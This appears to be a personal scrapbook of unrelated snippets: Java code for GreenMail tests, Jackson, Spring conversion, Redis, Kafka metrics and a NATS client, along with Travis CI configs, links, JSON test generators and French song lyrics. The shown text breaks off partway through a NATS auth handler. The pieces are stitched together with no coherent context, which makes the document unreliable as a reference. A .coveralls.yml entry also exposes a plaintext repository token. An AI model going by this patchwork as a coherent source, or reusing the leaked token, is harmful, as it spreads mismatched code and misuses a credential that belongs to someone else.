==============================================================================================================
import javax.mail.MessagingException;
import javax.mail.internet.MimeMessage;

import com.icegreen.greenmail.configuration.GreenMailConfiguration;
import com.icegreen.greenmail.util.GreenMailUtil;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestInstance;
import org.junit.jupiter.api.extension.RegisterExtension;

import static org.junit.jupiter.api.Assertions.assertEquals;

@TestInstance(TestInstance.Lifecycle.PER_CLASS)
@DisplayName("GreenMail with configuration tests")
class WithConfigurationTests {
    @RegisterExtension
    GreenMailExtension greenMail = new GreenMailExtension()
        .withConfiguration(GreenMailConfiguration.aConfig()
            .withUser("to@localhost.com", "login-id", "password"));

    @Test
    @DisplayName("Receive test")
    void testReceive() throws MessagingException {
        GreenMailUtil.sendTextEmailTest("to@localhost.com", "from@localhost.com", "subject", "body");
        final MimeMessage[] emails = greenMail.getReceivedMessages();
        assertEquals(1, emails.length);
        final MimeMessage email = emails[0];
        assertEquals("subject", email.getSubject());
        assertEquals("body", GreenMailUtil.getBody(email));
    }
}
==============================================================================================================
Prepare data: use image to get byte array

InputStream inputStream = FileUtils.openInputStream(new File("config/images.jpg"));
byte[] pic = IOUtils.toByteArray(inputStream);
Pojo pojo = new Pojo();
pojo.setId("1");
pojo.setPic(pic);
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(pojo);
--Situation 1: use readvalue to object => the image2.jpg is correct

Pojo tranPojo = mapper.readValue(json, Pojo.class);

byte[] tranPicPojo = tranPojo.getPic();
InputStream isPojo = new ByteArrayInputStream(tranPicPojo);
File tranFilePojo = new File("config/images2.png");
FileUtils.copyInputStreamToFile(isPojo, tranFilePojo);
--Situation 2: use readvalue to Map and get String => the image3.jpg is broken

Map<String, String> map = mapper.readValue(json, Map.class);

byte[] tranString = map.get("pic").getBytes();
InputStream isString = new ByteArrayInputStream(tranString);
File tranFileString = new File("config/images3.png");
FileUtils.copyInputStreamToFile(isString, tranFileString);
==============================================================================================================
List<A> source = Collections.emptyList();
TypeDescriptor sourceType = TypeDescriptor.collection(List.class, TypeDescriptor.valueOf(A.class));
TypeDescriptor targetType = TypeDescriptor.collection(List.class, TypeDescriptor.valueOf(B.class));
List<B> target = (List<B>) conversionService.convert(source, sourceType, targetType);

@SuppressWarnings({"rawtypes", "unchecked"})
public <T> List<T> convert(List<?> sourceList, Class<T> targetClass) {

    Assert.notNull(sourceList, "Cannot convert null list.");
    List<Object> targetList = new ArrayList();

    for (int i = 0; i < sourceList.size(); i++) {
        Object o = super.convert(sourceList.get(i), targetClass);
        targetList.add(o);
    }

    return (List<T>) targetList;
}


public static <T, U> List<U> convertList(final ConversionService service, final List<T> source, final Class<U> destType) {

    final List<U> dest = new ArrayList<U>();

    if (source != null) {
        for (final T element : source) {
            dest.add(service.convert(element, destType));
        }
    }
    return dest;
}


public class SqlRowSetToCollectionConverterService implements Converter<SqlRowSet, Collection<?>> {

    private SqlRowSetToCollectionConverter<?>[] converters;

    public void setConverters (SqlRowSetToCollectionConverter<?>[] aConverters) {
        converters = aConverters;
    }

    @Override
    public Collection<?> convert (SqlRowSet aSource) {
        for (SqlRowSetToCollectionConverter<?> converter : converters) {
            if (converter.canConvert (aSource)) {
                return (converter.convert(aSource));
            }
        }
        return null;
    }

}

@Nullable
public Object convert(@Nullable Object source, TypeDescriptor targetType) {
  return convert(source, TypeDescriptor.forObject(source), targetType);
}


public <S, @NonNull T> Collection<T> convert(Collection<S> source, Class<T> targetType) {
  return (Collection<@NonNull T>) requireNonNull(conversionService.convert(source, TypeDescriptor.collection(List.class, TypeDescriptor.valueOf(targetType))));
}


==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
@Component
public class RedisObjectHelper {

    @Resource
    private RedisTemplate<String, ?> redisTemplate;
    private HashOperations<String, byte[], byte[]> hashOperations;
    private HashMapper<Object, byte[], byte[]> mapper;

    @PostConstruct
    public void init() {
        mapper = new ObjectHashMapper(new CustomConversions(Arrays.asList(new Timestamp2ByteConverter(), new Byte2TimestampConverter())));
        hashOperations = redisTemplate.opsForHash();
    }
    // and any methods
}

@Component
@ReadingConverter
public class BytesToOffsetDateTimeConverter implements Converter<byte[], OffsetDateTime> {
    @Override
    public OffsetDateTime convert(final byte[] source) {
        return OffsetDateTime.parse(new String(source), DateTimeFormatter.ISO_OFFSET_DATE_TIME);
    }
}
and writing converter:

@Component
@WritingConverter
public class OffsetDateTimeToBytesConverter implements Converter<OffsetDateTime, byte[]> {
    @Override
    public byte[] convert(final OffsetDateTime source) {
        return source.format(DateTimeFormatter.ISO_OFFSET_DATE_TIME).getBytes();
    }
}
And registered a RedisCustomConversions bean in the configuration:

import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.redis.core.convert.RedisCustomConversions;
import org.springframework.data.redis.repository.configuration.EnableRedisRepositories;

import java.util.Arrays;

@Configuration
@EnableRedisRepositories
public class RedisConfiguration {

    @Bean
    public RedisCustomConversions redisCustomConversions(OffsetDateTimeToBytesConverter offsetToBytes,
                                                         BytesToOffsetDateTimeConverter bytesToOffset) {
        return new RedisCustomConversions(Arrays.asList(offsetToBytes, bytesToOffset));
    }

}
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
==============================================================================================================
https://github.com/sslotsky/validate-this
https://github.com/scottpreston/js-examples
skupper.io
https://developers.redhat.com/blog/2020/01/02/kubernetes-native-spring-apps-on-quarkus/?sc_cid=701f2000000RtqCAAS
https://developers.redhat.com/blog/2019/12/30/serverless-kafka-on-kubernetes/?sc_cid=701f2000000RtqCAAS
https://opensource.com/article/20/1/python-web-api-pyramid-cornice?sc_cid=701f2000000RtqCAAS
http://www.apress.com/9781590595961
https://developers.redhat.com/search/?s=most-recent&f=type%7Ebook

Validation failed for argument [0] in public org.springframework.http.ResponseEntity com.paragon.microservices.confirmationlink.callback.controller.impl.IssueControllerImpl.acceptIssue(com.paragon.microservices.confirmationlink.callback.model.dto.IssueRequest,com.paragon.mailingcontour.commons.security.model.AuthenticatedUser): [Field error in object 'issueRequest' on field 'subject': rejected value []; codes [NotBlank.issueRequest.subject,NotBlank.subject,NotBlank.java.lang.String,NotBlank]; arguments [org.springframework.context.support.DefaultMessageSourceResolvable: codes [issueRequest.subject,subject]; arguments []; default message [subject]]; default message [Issue request model <subject> attribute should not be blank]] 
==============================================================================================================
import java.util.Map;

import org.apache.kafka.common.utils.Utils;

/**
 * The <code>MetricName</code> class encapsulates a metric's name, logical group and its related attributes. It should be constructed using metrics.MetricName(...).
 * <p>
 * This class captures the following parameters
 * <pre>
 *  <b>name</b> The name of the metric
 *  <b>group</b> logical group name of the metrics to which this metric belongs.
 *  <b>description</b> A human-readable description to include in the metric. This is optional.
 *  <b>tags</b> additional key/value attributes of the metric. This is optional.
 * </pre>
 * group, tags parameters can be used to create unique metric names while reporting in JMX or any custom reporting.
 * <p>
 * Ex: standard JMX MBean can be constructed like  <b>domainName:type=group,key1=val1,key2=val2</b>
 * <p>
 *
 * Usage looks something like this:
 * <pre>{@code
 * // set up metrics:
 *
 * Map<String, String> metricTags = new LinkedHashMap<String, String>();
 * metricTags.put("client-id", "producer-1");
 * metricTags.put("topic", "topic");
 *
 * MetricConfig metricConfig = new MetricConfig().tags(metricTags);
 * Metrics metrics = new Metrics(metricConfig); // this is the global repository of metrics and sensors
 *
 * Sensor sensor = metrics.sensor("message-sizes");
 *
 * MetricName metricName = metrics.metricName("message-size-avg", "producer-metrics", "average message size");
 * sensor.add(metricName, new Avg());
 *
 * metricName = metrics.metricName("message-size-max", "producer-metrics");
 * sensor.add(metricName, new Max());
 *
 * metricName = metrics.metricName("message-size-min", "producer-metrics", "message minimum size", "client-id", "my-client", "topic", "my-topic");
 * sensor.add(metricName, new Min());
 *
 * // as messages are sent we record the sizes
 * sensor.record(messageSize);
 * }</pre>
 */
public final class MetricName {

    private final String name;
    private final String group;
    private final String description;
    private Map<String, String> tags;
    private int hash = 0;

    /**
     * Please create MetricName by method {@link org.apache.kafka.common.metrics.Metrics#metricName(String, String, String, Map)}
     *
     * @param name        The name of the metric
     * @param group       logical group name of the metrics to which this metric belongs
     * @param description A human-readable description to include in the metric
     * @param tags        additional key/value attributes of the metric
     */
    public MetricName(String name, String group, String description, Map<String, String> tags) {
        this.name = Utils.notNull(name);
        this.group = Utils.notNull(group);
        this.description = Utils.notNull(description);
        this.tags = Utils.notNull(tags);
    }

    public String name() {
        return this.name;
    }

    public String group() {
        return this.group;
    }

    public Map<String, String> tags() {
        return this.tags;
    }

    public String description() {
        return this.description;
    }

    @Override
    public int hashCode() {
        if (hash != 0)
            return hash;
        final int prime = 31;
        int result = 1;
        result = prime * result + ((group == null) ? 0 : group.hashCode());
        result = prime * result + ((name == null) ? 0 : name.hashCode());
        result = prime * result + ((tags == null) ? 0 : tags.hashCode());
        this.hash = result;
        return result;
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj)
            return true;
        if (obj == null)
            return false;
        if (getClass() != obj.getClass())
            return false;
        MetricName other = (MetricName) obj;
        if (group == null) {
            if (other.group != null)
                return false;
        } else if (!group.equals(other.group))
            return false;
        if (name == null) {
            if (other.name != null)
                return false;
        } else if (!name.equals(other.name))
            return false;
        if (tags == null) {
            if (other.tags != null)
                return false;
        } else if (!tags.equals(other.tags))
            return false;
        return true;
    }

    @Override
    public String toString() {
        return "MetricName [name=" + name + ", group=" + group + ", description="
                + description + ", tags=" + tags + "]";
    }
}

/**
 * An upper or lower bound for metrics
 */
public final class Quota {

    private final boolean upper;
    private final double bound;

    public Quota(double bound, boolean upper) {
        this.bound = bound;
        this.upper = upper;
    }

    public static Quota upperBound(double upperBound) {
        return new Quota(upperBound, true);
    }

    public static Quota lowerBound(double lowerBound) {
        return new Quota(lowerBound, false);
    }

    public boolean isUpperBound() {
        return this.upper;
    }

    public double bound() {
        return this.bound;
    }

    public boolean acceptable(double value) {
        return (upper && value <= bound) || (!upper && value >= bound);
    }

    @Override
    public int hashCode() {
        final int prime = 31;
        int result = 1;
        result = prime * result + (int) this.bound;
        result = prime * result + (this.upper ? 1 : 0);
        return result;
    }

    @Override
    public boolean equals(Object obj) {
        if (this == obj)
            return true;
        if (!(obj instanceof Quota))
            return false;
        Quota that = (Quota) obj;
        return (that.bound == this.bound) && (that.upper == this.upper);
    }

    @Override
    public String toString() {
        return (upper ? "upper=" : "lower=") + bound;
    }
}
==============================================================================================================
language: java
sudo: false
install: true
addons:
  sonarcloud:
    organization: "your_organization_key"
    token:
      secure: "$SONAR_TOKEN"
jdk:
  - oraclejdk8
script:
  - mvn clean org.jacoco:jacoco-maven-plugin:prepare-agent package sonar:sonar
cache:
  directories:
    - '$HOME/.m2/repository'
    - '$HOME/.sonar/cache'

import org.junit.Assert;
import org.junit.runner.RunWith;
import org.lognet.springboot.grpc.demo.DemoApp;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.context.junit4.SpringRunner;

import static org.springframework.boot.test.context.SpringBootTest.WebEnvironment.NONE;

@RunWith(SpringRunner.class)
@SpringBootTest(classes = {DemoApp.class}, webEnvironment = NONE, properties = {"grpc.port=0","grpc.shutdownGrace=-1"})
public class RandomGrpcPortTest extends GrpcServerTestBase {

    @Override
    protected void beforeGreeting() {
        Assert.assertEquals(0,gRpcServerProperties.getPort().intValue());

    }
}

https://www.motobit.com/tips/

public String trim(String str) {
    return str.trim()/*.replace("\n", "").replace("\r", "")*/;
}
then add the following to the VelocityContext that you create:

    context.put("trimmer", this);
and finally in the velocity template do the following

<a href="#">$trimmer.trim("#render_something('xxx')")</a>

Je ne sais plus comment te dire
Je ne trouve plus les mots
Ces mots qui te faisaient rire
Et ceux que tu trouvais beaux
J'ai tant de fois voulu t'écrire
Et tant de fois courbé le dos
Et pour revivre nos souvenirs
J'ai même aussi frôlé ta peau
Oh, dis-moi
Regarde-moi
Je ne sais plus comment t'aimer
Ni comment te garder
Parle-moi
Oui, parle-moi
Je ne sais plus pourquoi t'aimer
Ni pourquoi continuer
Tu es là
Mais tu es si loin
De moi
Je ne sais plus comment poursuivre
Cet amour qui n'en est plus
Je ne sais plus que souffrir
Souffrir autant que j'y ai cru
Mais je sais qu'il me faut survivre
Et avancer un pas de plus
Pour qu'enfin cesse la dérive
Des moments à jamais perdus
Oh, dis-moi
Regarde-moi
Je ne sais plus comment…

Pourquoi je vis, pourquoi, je meurs?
Pourquoi je ris, pourquoi je pleure?
Voici le S.O.S
D'un terrien en détresse
J'ai jamais eu les pieds sur terre
J'aimerais mieux être un oiseau
J'suis mal dans ma peau
J'voudrais voir le monde à l'envers
Si jamais c'était plus beau
Plus beau vu d'en haut
D'en haut
J'ai toujours confondu la vie
Avec les bandes dessinées
J'ai comme des envies de métamorphoses
Je sens quelque chose
Qui m'attire, qui m'attire, qui m'attire vers le haut
Au grand loto de l'univers
J'ai pas tiré l'bon numéro
J'suis mal dans ma peau
J'ai pas envie d'être un robot
Métro boulot dodo
Wou-oh
Ahah

https://www.youtube.com/watch?v=3AoS_7u9eCU
https://www.baeldung.com/sonar-qube

{
  "body": {
    "id": 100,
    "description": "Small pack of bolts",
    "processDate": "2015-07-01"
  },
  "generators": {
      "body": {
          "$.id": {
              "type": "RandomDecimal",
              "digits": 5
          },
          "$.description": {
              "type": "RandomString",
              "size": 20
          },
          "$.processDate": {
              "type": "Date"
          }
      }
  }
  
       "generators": { 
                    "body": { 
                        "$.employee.id": { 
                            "type": "RandomInt", 
                            "min": 0, 
                            "max": 2147483647 
                        }, 
                        "$.employee.firstName": { 
                            "type": "RandomString", 
                            "size": 20 
                        }, 
                        "$.employee.surname": { 
                            "type": "RandomString", 
                            "size": 20 
                        } 
                    }
                }
}


mvn -U -B -V --fail-at-end -Dgpg.skip=true -Dfile.encoding=UTF-8 -DskipTests=true -Dmaven.javadoc.skip=true -DskipCheckStyle=true clean install -P test
==============================================================================================================
import io.nats.client.AsyncSubscription;
import io.nats.client.Connection;
import io.nats.client.Message;
import io.nats.client.Nats;
import io.nats.client.Options;
import io.nats.client.Subscription;
import io.nats.client.SyncSubscription;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public final class NatsClient {

    private final String serverURI;

    private final Connection natsConnection;

    private final Map<String, Subscription> subscriptions = new HashMap<>();

    private final static Logger log = LoggerFactory.getLogger(NatsClient.class);

    NatsClient() {
        this.serverURI = "jnats://localhost:4222";
        natsConnection = initConnection(serverURI);
    }

    public NatsClient(String serverURI) {
        if ((serverURI != null) && (!serverURI.isEmpty())) {
            this.serverURI = serverURI;
        } else {
            this.serverURI = "jnats://localhost:4222";
        }

        natsConnection = initConnection(serverURI);
    }

    public void closeConnection() {
        // Close connection
        natsConnection.close();
    }

    private Connection initConnection(String uri) {
        try {
            Options options = new Options.Builder()
              .errorCb(ex -> log.error("Connection Exception: ", ex))
              .disconnectedCb(event -> log.error("Channel disconnected: {}", event.getConnection()))
              .reconnectedCb(event -> log.error("Reconnected to server: {}", event.getConnection()))
              .build();

            return Nats.connect(uri, options);
        } catch (IOException ioe) {
            log.error("Error connecting to NATs! ", ioe);
            return null;
        }
    }

    void publishMessage(String topic, String replyTo, String message) {
        try {
            natsConnection.publish(topic, replyTo, message.getBytes());
        } catch (IOException ioe) {
            log.error("Error publishing message: {} to {} ", message, topic, ioe);
        }
    }

    public void subscribeAsync(String topic) {

        AsyncSubscription subscription = natsConnection.subscribe(
          topic, msg -> log.info("Received message on {}", msg.getSubject()));

        if (subscription == null) {
            log.error("Error subscribing to {}", topic);
        } else {
            subscriptions.put(topic, subscription);
        }
    }

    SyncSubscription subscribeSync(String topic) {
        return natsConnection.subscribe(topic);
    }

    public void unsubscribe(String topic) {
        try {
            Subscription subscription = subscriptions.get(topic);

            if (subscription != null) {
                subscription.unsubscribe();
            } else {
                log.error("{} not found. Unable to unsubscribe.", topic);
            }
        } catch (IOException ioe) {
            log.error("Error unsubscribing from {} ", topic, ioe);
        }
    }

    Message makeRequest(String topic, String request) {
        try {
            return natsConnection.request(topic, request.getBytes(), 100);
        } catch (IOException | InterruptedException ioe) {
            log.error("Error making request {} to {} ", topic, request, ioe);
            return null;
        }
    }

    void installReply(String topic, String reply) {
        natsConnection.subscribe(topic, message -> {
            try {
                natsConnection.publish(message.getReplyTo(), reply.getBytes());
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    SyncSubscription joinQueueGroup(String topic, String queue) {
        return natsConnection.subscribe(topic, queue);
    }
}
==============================================================================================================
dist: trusty
language: java
sudo: required
jdk:
- openjdk8
- openjdk9
- openjdk10
- openjdk11
- oraclejdk8
- oraclejdk9
before_script:
- wget "https://github.com/nats-io/nats-streaming-server/releases/download/v0.16.0/nats-streaming-server-v0.16.0-linux-amd64.zip"
  -O tmp.zip
- unzip tmp.zip
- mv nats-streaming-server-v0.16.0-linux-amd64 stan
before_install:
- openssl aes-256-cbc -K $encrypted_4d67c1484586_key -iv $encrypted_4d67c1484586_iv
  -in .travis/nats.travis.gpg.enc -out .travis/nats.travis.gpg -d
install:
- "./gradlew assemble"
script:
- "./gradlew check"
before_cache:
- rm -f  $HOME/.gradle/caches/modules-2/modules-2.lock
- rm -fr $HOME/.gradle/caches/*/plugin-resolution/
cache:
  directories:
  - "$HOME/.gradle/caches/"
  - "$HOME/.gradle/wrapper/"
after_success:
- "./gradlew test jacocoTestReport coveralls"
- |
  if [ "${TRAVIS_BRANCH}" == "master" ] && [ -z "${TRAVIS_TAG}" ] && [ "${TRAVIS_JDK_VERSION}" == "oraclejdk8" ]; then
    ./gradlew -i publishToSonatype
  fi
- |
  if [ "${TRAVIS_BRANCH}" == "${TRAVIS_TAG}" ] && [ ! -z "${TRAVIS_TAG}" ] && [ "${TRAVIS_JDK_VERSION}" == "oraclejdk8" ]; then
    ./gradlew -i sign publishToSonatype closeAndReleaseRepository
  fi
env:
  global:
  - stan_path=$TRAVIS_BUILD_DIR/stan/nats-streaming-server
  - GPG_KEYRING_FILE=.travis/nats.travis.gpg
  - secure: T/D5pMoZiDU6O3gU70D/qUJIvggI412y4nCw7WhC4JKDFMNIAa2enPfCrm9Np8sjuT2CF8hW4+SR7Adv5yZnMVIkCos1vmWjuz/yH/3+TRVANMr4fzUS3KsBCfl421qRxbtBt8frlOSdOpAYsqBscel9Jsvx22UVNV8qspXkYhjnQmX8mpgXj8yz1l6Y82htda/hB4dozgPcTMoLpT21yPwHlU8NdiTs1Bsj1JL7vz/PEzuNNylYLWoa2J6mvn1i3B/FjtgZwCeYydvel36QrFRoiK+Blo0iz1vOKnt3vAAQ6z5fkRGNjqxxiYzEGOP34uRvoSmJv6cHpqVV6gwQJJ+ntVZqrkjtdUqyffWE0wp0Pzf9c0fPaqBt/BtXdL0051+fgVpX8apkEM6amcF12S41i/XmhtLK452fsidfOEsdAV7OCVEJeahQPy5zX6CCUM/VqZoWaVmjC6TEW+Ai84tO3QkPLV1BChN46LBY+qapLMpPsmWyn0+pvmBtqiHCfDjhSuDQVwWsPKM83ealpFEtqmfOgKDc+FIAtLWcW8k7RUImQz3Qe325PQ/0r+voiuV7GQTI+68GkX5IyMwa8nXVOVxROy67IatIzYC6BQsoLb9YDCHuQq6j3AVe3np0OQ4MT8daCQZoL4sTh3lKR85u0gPLHhv9ybzAqAWvUrs=
  - secure: qJcqsoZNwQec+pMYWiCS3eucerDBCiRlh4uXm81523QHTYjYxd+paK+XYSFoG+5goSx7eTbvlDsXz7ctBGU836r1GgOzheki8WMLwYhrdWKJH0OrHVlH+6UsQvQ3Y/UkWBCWvM3V+zeJ8phUAMo1W3OYZK9fYe8TXTlW725/UH+dETfpyCGbSH1KFIKp9bgO9t42iy34Ruhx/HRsaCtpdsCVaOKEo7WyEIuZXOo7RbeJKieGPig5o+mDeiOti8WCBpsHL3EmaCbbqxrPIKGjfn4RksS/h0gr1kHVc52H7GaB8YLF23Whpgq5EbBZ6b4HcNxqS8YF5dkdYFuqq/8XNu4F3JVZhVEsrbRwwSmi7LolFZtV5aHFv2pEyr99FfdPfhlzJVXD+chOyfcaeyx3bOnFsl/Q/SlNf/e6aCxsgFD1PUZHpj2svkNKNWagwRVGmfEEal6pWl3MPxIstevZK4c1Ot7ExSKGuTgHYVlUd+J/Y5A66fKU5a7dRtCQJQ5zxm0vl0mWONFCZECpULpBuXS2ajAd2ajy6IVXEiZeUvyfNTmk/9KCUD5WwxSaRmh5SK4tf32O5TaEXNpyT4HJHW7MqooSpr7jvRm7kjmdMU1Smzc83NI0/WePw7wcud8qTGNlIMewJlTCP2ol8N6wCnSKJCP8bQDxDmG5dFFMFCg=
  - secure: egT874iZk81lBqbklIGxqu9QzPZ1twXiz4MoXmmdZi3Oow2YCWLI/aQQgcDoUDNIsYYTiqC29l464Hs28E0yJNMEi6ZB/sG/H/lQgXnDPQY1IsrOpV+0dS1j7tcWaybLFR7XY4yP66xny+nEHcgCysmv35+54tDze0c4V/dvlyALBGR0+xVBLvK1t4L9iarKjxjuwHwo1Xw4cRHzlIZnuJeVQJK3H7ykjKBy6IrbUNmR/Zyjs1WJRo1mlcICIu3Q7c/5Uocx+vwOQwyD5Mfw3sZzjXwfykQGP9A3Om/ZQ6WxSJ2B30B6V2v+YXUtsIO7cqMFYDT+moTuG4ffIQOX9wmCad56XTLOanqHjNQbaKU5ygzXHtVne1GEq6nz+X3QpZExSIp3qlKnfi+tVFfeBtGYPU2uSkmdsvaOr0HVYaHtcvSkemds4vox3jZ0sRn3VsZH8ftM/GT9kGD47NKwj1VeFuXhtDZsChYzz/tv0F5wSOAX1kfku8wmodzxyFeFqw13bfbD9nq6pM7LSZi/5sG6meONsAeRhZsKx/d1gaAVbnx8XTV2aNt3yhUnIMzL5zC3Qy3eRgESR+fax5bimbav1jYMaEfrN9QWBWPZ8LBJhto+9u3T+wPFeKY4a0h4ZKoIbGCVDlExzqrl1Hh2c5HwjM9L7BXaEBviinZoGIQ=
  - secure: 01oTIjzhriCRiK1CNAkd7KaRSclPMdHcaWhQkrYgwYcboCeUrs0LIVPYts+gB+FE3MsJyRwMfrug4qM/gJQBrHbddYpleZFUPQXZ1rWKpkzzxFP1PD51886k2Cumxd3KvrjdUj/NZ7UITVQ9SbI+dlJFaAM5mLXLBWwk7NVtDKZEnIyxFC3rsexbS4NwPRiU1muX/wPhaMjtH8bHdnqC+6B6aZ+/165n7MhfF8c+ABqB4XmLMPcNmp5oiX/zGDng/17inNquZywCaJkm0Qq+98SwXrICeTVhS4TV6hT8orYFKBynQLMMCCG1EKVRydTkDw6OZJt16aqJKWhuW1RNCcpCU1DiEPWQGBirGuGcuFdpmg9f8t6dtXqrXK1IY4zxy5iyF2VjXeLGWZEtoTryLQnaKggbWzDZAimGtdDnyAK5TBp8g+ODsK/ArsEVQC4d19nL0cXTX+DxvVfeq+QPUH00k2+Qz9FJ4Kv1a8cGnTa0miC0oETZe5KwtivdHoQtr8698b7FxgW/t1jp3QLfoxpBE6omJMusgOvY/gmmS1ZvZ3Kn2sNPEcEUDX3+SIWEhXJ3jTo+e4Sf25pyi/VNLV5Uocu1AxT1/IQ0SKho316hV5jsqy3JxVv3I55yDIDHNupLJ/ST9/zRCAEG0wJOTUMEjgLhJS4DSNDrb/uCLxI=



.coveralls.yml
service_name: travis-ci
repo_token: 7fvWrchpHceKauTqp3PgceKvsWYMAN6S7
==============================================================================================================
/**
 * Applications can use a ConnectionListener to track the status of a {@link Connection Connection}. The 
 * listener is configured in the {@link Options Options} at creation time.
 */
public interface ConnectionListener {
    public enum Events {
        /** The connection has successfully completed the handshake with the nats-server. */
        CONNECTED("nats: connection opened"),
        /** The connection is permanently closed, either by manual action or failed reconnects. */
        CLOSED("nats: connection closed"),
        /** The connection lost its connection, but may try to reconnect if configured to. */
        DISCONNECTED("nats: connection disconnected"), 
        /** The connection was connected, lost its connection and successfully reconnected. */
        RECONNECTED("nats: connection reconnected"), 
        /** The connection was reconnected and the server has been notified of all subscriptions. */
        RESUBSCRIBED("nats: subscriptions re-established"),
        /** The connection was told about new servers from, from the current server. */ 
        DISCOVERED_SERVERS("nats: discovered servers");

        private String event;

        Events(String err) {
            this.event = err;
        }

        /**
         * @return the string value for this event
         */
        public String toString() {
            return this.event;
        }
    }

    /**
     * Connection related events that occur asynchronously in the client code are
     * sent to a ConnectionListener via a single method. The ConnectionListener can
     * use the event type to decide what to do about the problem.
     * 
     * @param conn the connection associated with the error
     * @param type the type of event that has occurred
     */
    public void connectionEvent(Connection conn, Events type);
}
==============================================================================================================
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.CharBuffer;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;

import io.nats.client.AuthHandler;
import io.nats.client.NKey;

class FileAuthHandler implements AuthHandler {
    private String jwtFile;
    private String nkeyFile;
    private String credsFile;

    FileAuthHandler(String creds) {
        this.credsFile = creds;
    }

    FileAuthHandler(String jwtFile, String nkeyFile) {
        this.jwtFile = jwtFile;
        this.nkeyFile = nkeyFile;
    }

    private char[] extract(CharBuffer data, int headers) {
        CharBuffer buff = CharBuffer.allocate(data.length());
        boolean skipLine = false;
        int headerCount = 0;
        int linePos = -1;

        while (data.length() > 0) {
            char c = data.get();
            linePos++;

            // End of line, either we got it, or we should keep reading the new line
            if (c == '\n' || c=='\r') {
                if (buff.position() > 0) { // we wrote something
                    break;
                }
                skipLine = false;
                linePos = -1; // so we can start right up
                continue;
            }

            // skip to the new line
            if (skipLine) {
                continue;
            }

            // Ignore whitespace
            if (Character.isWhitespace(c)) {
                continue;
            }

            // If we are on a - skip that line, bump the header count
            if (c == '-' && linePos == 0) {
                skipLine = true;
                headerCount++;
                continue;
            }

            // Skip the line, or add to buff
            if (!skipLine && headerCount==headers) {
                buff.put(c);
            }
        }

        // check for naked value
        if (buff.position() == 0 && headers==1) {
            data.position(0);
            while (data.length() > 0) {
                char c = data.get();
                if (c == '\n' || c=='\r' || Character.isWhitespace(c)) {
                    if (buff.position() > 0) { // we wrote something
                        break;
                    }
                    continue;
                }
    
                buff.put(c);
            }
            buff.flip();
        } else {
            buff.flip();
        }

        char[] retVal = new char[buff.length()];
        buff.get(retVal);
        buff.clear();
        for (int i=0; i<buff.capacity();i++) {
            buff.put('\0');
        }
        return retVal;
    }

    private char[] readKeyChars() throws IOException {
        char[] keyChars = null;

        if (this.credsFile != null) {
            byte[] data = Files.readAllBytes(Paths.get(this.credsFile));
            ByteBuffer bb = ByteBuffer.wrap(data);
            CharBuffer chars = StandardCharsets.UTF_8.decode(bb);
            keyChars = this.extract(chars, 3); // we are 2nd so 3 headers
            // Clear things up as best we can
            chars.clear();
            for (int i=0; i<chars.capacity();i++) {
                chars.put('\0');
            }
            for (int i=0;i<data.length;i++) {
                data[i] = 0;
            }
        } else {
            byte[] data = Files.readAllBytes(Paths.get(this.nkeyFile));
            ByteBuffer bb = ByteBuffer.wrap(data);
            CharBuffer chars = StandardCharsets.UTF_8.decode(bb);
            keyChars = this.extract(chars, 1);
            // Clear things up as best we can
            chars.clear();
            for (int i=0; i<chars.capacity();i++) {
                chars.put('\0');
            }
            for (int i=0;i<data.length;i++) {
                data[i] = 0;
            }
        }

        return keyChars;
    }

    /**
     * Sign is called by the library when the server sends a nonce.
     * The client's NKey should be used to sign the provided value.
     * 
     * @param nonce the nonce to sign
     * @return the signature for the nonce
     */ 
    public byte[] sign(byte[] nonce) {
        try {
            char[] keyChars = this.readKeyChars();
            NKey nkey =  NKey.fromSeed(keyChars);
            byte[] sig = nkey.sign(nonce);
            nkey.clear();
            return sig;
        } catch (Exception exp) {
            throw new IllegalStateException("problem signing nonce", exp);
        }
    }

    /**
     * getID should return a public key associated with a client key known to the server.
     * If the server is not in nonce-mode, this array can be empty.
     * 
     * @return the public key as a char array
     */
    public char[] getID() {
        try {
            char[] keyChars = this.readKeyChars();
            NKey nkey =  NKey.fromSeed(keyChars);
            char[] pubKey = nkey.getPublicKey();
            nkey.clear();
            return pubKey;
        } catch (Exception exp) {
            throw new IllegalStateException("problem getting public key", exp);
        }
    }

    /**
     * getJWT should return the user JWT associated with this connection.
     * This can return null for challenge only authentication, but for account/user
     * JWT-based authentication you need to return the JWT bytes here.
     * 
     * @return the user JWT
     */ 
    public char[] getJWT() {
        try {
            char[] jwtChars = null;
            String fileToUse = this.jwtFile;

            if (this.credsFile != null) {
                fileToUse = this.credsFile;
            }

            // If no file is provided, assume this is challenge only authentication
            // and simply return null here.
            if (fileToUse == null) {
                return null;
            }

            byte[] data = Files.readAllBytes(Paths.get(fileToUse));
            ByteBuffer bb = ByteBuffer.wrap(data);
